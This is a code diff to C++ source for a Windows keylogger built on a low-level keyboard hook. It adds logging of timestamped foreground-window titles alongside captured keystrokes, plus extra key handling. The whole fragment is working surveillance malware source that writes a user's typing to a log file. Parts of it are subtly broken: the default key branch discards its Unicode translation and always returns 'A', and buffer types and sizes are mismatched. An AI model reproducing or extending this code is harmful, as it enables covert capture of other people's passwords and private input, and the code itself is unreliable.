@@ -64,7 +64,9 @@ int Winkey::Hook() {
 */
 LRESULT CALLBACK Winkey::onKey(int nCode, WPARAM wParam, LPARAM lParam) {
 	if (wParam == WM_KEYDOWN) {
-		PKBDLLHOOKSTRUCT kbdEv = (PKBDLLHOOKSTRUCT)lParam;
+		KBDLLHOOKSTRUCT* kbdEv = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
+
+		logCurrentWindow();
 
 		const char* data = solve(kbdEv);
 		DWORD bytesWrote;
@@ -75,8 +77,9 @@ LRESULT CALLBACK Winkey::onKey(int nCode, WPARAM wParam, LPARAM lParam) {
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
-const char*	Winkey::solve(PKBDLLHOOKSTRUCT kbdEv) {
+const char *Winkey::solve(KBDLLHOOKSTRUCT *kbdEv) {
 	switch (kbdEv->vkCode) {
+	case VK_BACK:		return "[BACKSPACE]";
 	case VK_ESCAPE:		return "[ESC]";
 	case VK_DELETE:		return "[DELETE]";
 	case VK_LEFT:		return "[LEFTARROW]";
@@ -92,9 +95,44 @@ const char*	Winkey::solve(PKBDLLHOOKSTRUCT kbdEv) {
 	case VK_CONTROL:
 	case VK_LCONTROL:
 	case VK_RCONTROL:	return "[CTRL]";
-	case VK_RETURN:		return "\n";
+	case VK_RETURN:		return "\\n";
 	default:
-		return std::format("{:c}", kbdEv->vkCode).c_str();
+		BYTE keyboardState[256];
+		GetKeyboardState(keyboardState);
+
+		CHAR unicodeBuffer[16] = {0};
+		ToUnicode(
+			kbdEv->vkCode,
+			kbdEv->scanCode,
+			keyboardState,
+			reinterpret_cast<LPWSTR>(unicodeBuffer),
+			8,
+			0
+		);
+
+		return "A";
+	}
+}
+
+void Winkey::logCurrentWindow() {
+	TCHAR	currentWindowTitle[512] = {0};
+
+	GetWindowText(GetForegroundWindow(), currentWindowTitle, sizeof(currentWindowTitle));
+
+	if (strcmp(gLastWindowTitle, currentWindowTitle) != 0) {
+		strcpy_s(gLastWindowTitle, currentWindowTitle);
+
+		std::time_t t = std::time(nullptr);
+		struct tm new_time;
+		localtime_s(&new_time, &t);
+
+		char mbstr[100 + sizeof(currentWindowTitle)] = {0};
+		std::strftime(mbstr, sizeof(mbstr), "%d.%m.%Y %H:%M:%S", &new_time);
+
+		const std::string to_write = std::format("[{}] - '{}'\n", mbstr, currentWindowTitle);
+
+		DWORD bytesWrote;
+		WriteFile(gLogHandle, to_write.c_str(), to_write.length(), &bytesWrote, NULL);
 	}
 }
 
